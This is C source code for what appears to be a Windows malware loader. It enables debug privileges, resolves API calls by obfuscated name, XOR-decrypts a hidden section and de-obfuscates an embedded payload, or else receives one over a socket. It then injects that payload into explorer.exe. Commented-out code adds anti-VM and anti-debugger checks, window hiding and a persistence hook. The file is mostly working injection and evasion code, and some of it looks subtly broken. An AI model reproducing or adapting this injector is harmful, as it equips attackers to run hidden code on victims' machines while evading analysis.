#include <Windows.h>
#include <stdio.h>
#include "injector.h"
#include "config.h"
#include <time.h>
#include "payload.h"
//#include "string_decrypt.h"
//#include "VM-detect.h"
#include "debugger-detect.h"

void SetSeDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tokenPrivileges;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return;

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return;
    }

    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = luid;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

    CloseHandle(hToken);
}

BOOL IsDuplicate()
{
    DWORD currentpid = GetCurrentProcessId();
    char filepath[MAX_PATH];
    GetModuleFileNameA(NULL, filepath, MAX_PATH);

    char *filename = strrchr(filepath, '\\');
    if (filename) {
        filename++;  // Move past the last backslash
    } else {
        filename = filepath;  // No backslash found, the path is the filename
    }

    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;
    // Take a snapshot of all processes in the system
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe32.dwSize = sizeof(PROCESSENTRY32);
    // Retrieve information about the first process
    Process32First(hProcessSnap, &pe32);
    // Iterate through the processes to find the one with the specified name

    HANDLE kernel32 = getModuleByName(aKernel32dll);
    pOpenProcess _OpenProcess = (pOpenProcess) getFuncByName(kernel32, aOpenProcess);
    pCloseHandle _CloseHandle = getFuncByName(kernel32, aCloseHandle);
    do {
        if (strcmp(pe32.szExeFile, filename) == 0) {
            if (pe32.th32ProcessID != currentpid){
                char tmp[MAX_PATH];
                HANDLE hProc = _OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                if (hProc==NULL) continue;
                GetModuleFileNameA(hProc, tmp, MAX_PATH);
                if (filepath == tmp){
                    #ifdef DEBUG
                    printf("[+] Duplicate process found, quitting!\n");
                    #endif
                    _CloseHandle(hProc);
                    return TRUE;
                }
                _CloseHandle(hProc);
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));
    return FALSE;
}



//int BUFFER_Size = sizeof(embeded_payload);

void RemoveEntropy()
{
    for (int i = 0; i < BUFFER_Size /2; i++)
        embeded_payload[i] = (embeded_payload[i] << 4) ^ embeded_payload[i + (BUFFER_Size / 2)];

}
LPVOID getcurProcBaseAddr()
{
    PPEB peb;
#ifdef _WIN64
    peb = (PPEB)__readgsqword(0x60);
#endif
    return (LPVOID)peb->ImageBaseAddress;
}


void decrypt()
{
    LPVOID procbase = getcurProcBaseAddr();
    DWORD signature = 0xaabbccdd;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)procbase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((char*)procbase + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER currentSection = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i)
    {
        if (*((DWORD64*)currentSection->Name) == 0x656d616e662e) {
            // printf("found\n");
            break;
        }
        ++currentSection;
    }

    int sectionSize = currentSection->SizeOfRawData;
    PVOID addr = (PVOID)((char*)procbase + currentSection->VirtualAddress);
    //ULONG oldProtect = PAGE_READONLY;

    //NTSTATUS check = NtProtectVirtualMemory((HANDLE)-1, (PVOID*)( & addr), (PSIZE_T)&sectionSize, PAGE_READWRITE, (PULONG)&oldProtect);
    //if (check)
    //{
    //    exit(0);
    //}
    //VirtualProtect(addr, sectionSize, PAGE_READWRITE, &oldProtect);
    // printf("Worked\n");
// printf("decrypting\n");
    DWORD* tmp = (DWORD*)addr;
    for (int i = 0; i < sectionSize ; i += 4)
    {
        *tmp ^= signature;
        ++tmp;
    }
    //oldProtect = PAGE_READWRITE;
    printf("[+] Successfully decrypt section!\n");

    //check = NtProtectVirtualMemory((HANDLE)-1, (PVOID*)( & addr), (PSIZE_T)&sectionSize, PAGE_READONLY, (PULONG)&oldProtect);
    //if (check == 0)
    //{
    //    printf("[+] Successfully decrypt rdata section!\n");
    //}
    //VirtualProtect(addr, sectionSize, PAGE_READONLY, &oldProtect);
}

int main()
{
    SetSeDebugPrivilege();
    
    //HWND window = GetConsoleWindow();
    //ShowWindow(window, SW_HIDE);
    decrypt();
    //printf("GetModuleHandleA: %p, getcurprocbaseaddr: %p\n", GetModuleHandleA(NULL), getcurProcBaseAddr());
    if (IsDuplicate()) { 
        exit(0); 
    }
    srand((int)time(0));   
    // #ifdef DEBUG
    // char logpath[MAX_PATH];
    // GetCurrentProcessDirectory(logpath, MAX_PATH);
    // strcpy(logpath + strlen(logpath), "\\log.txt");
    // // printf("%s\n", logpath);
    // freopen(logpath, "w", stdout);
    // #endif
    //if (Debugger)
    // if (VMDetect())
    // {
    //     #ifdef DEBUG
    //     printf("[x] VM detected! Operation abort!\n");
    //     #endif // DEBUG
    //     exit(0);
    // }
    // else    
    // {
    //     #ifdef DEBUG
    //     printf("[+] VM has not been detected! Operation continue!\n");
    //     #endif
    // }
    
//    if (CheckDebugPresentBit() || CheckNTGlobalFlag())
//    {
//#ifdef DEBUG
//        printf("[x] Debugger has been detected, operation abort!\n");
//#endif
//        exit(0);
//    }
//    else
//    {
//#ifdef DEBUG
//        printf("[+] No debugger has been detected, operation continue!\n");
//#endif
//    }


    #ifdef DEBUG
    printf("[.] Waiting for explorer.exe\n");
    #endif

    DWORD targetpid = 0;
    
    //printf("Enter target pid: ");
    //scanf("%ud", &targetpid);
    while (targetpid == 0)
    {
        Sleep(500);
        targetpid = FindPIDByName(L"explorer.exe");
    }
    #ifdef DEBUG
    printf("[+] Target pid: %d\n", targetpid);
    #endif
    

    unsigned char * payload;
    
    unsigned char * key;
    int keylen;

    // RunEdit(); /// add persistence

    #ifdef PAYLOAD_EMBED    // spawn calc.exe
    loadRSRC();
    RemoveEntropy();
    payload = embeded_payload;
    BUFFER_Size = BUFFER_Size / 2;
    //RemoveEntropy();      //deobfuscate payload
    #else
    SOCKET pSocket;
    Listenner(&pSocket);
    PayloadReceive(&pSocket, &buffer, &bufferlen, &key, &keylen);
    //Decrypt(buffer, bufferlen, key, keylen);
    #endif


    HANDLE kernel32 = getModuleByName(aKernel32dll);
    pOpenProcess _OpenProcess = (pOpenProcess) getFuncByName(kernel32, aOpenProcess);
    HANDLE hProcess = _OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetpid);
    if (hProcess)
    {
        InjectPayload(hProcess, payload , BUFFER_Size);
    }
    else
    {
        #ifdef DEBUG
        printf("[x] Fail to open process!\n");
        #endif // DEBUG
        return -1;
    }
    pCloseHandle _CloseHandle = getFuncByName(kernel32, aCloseHandle);
    _CloseHandle(hProcess);
    return 0;
}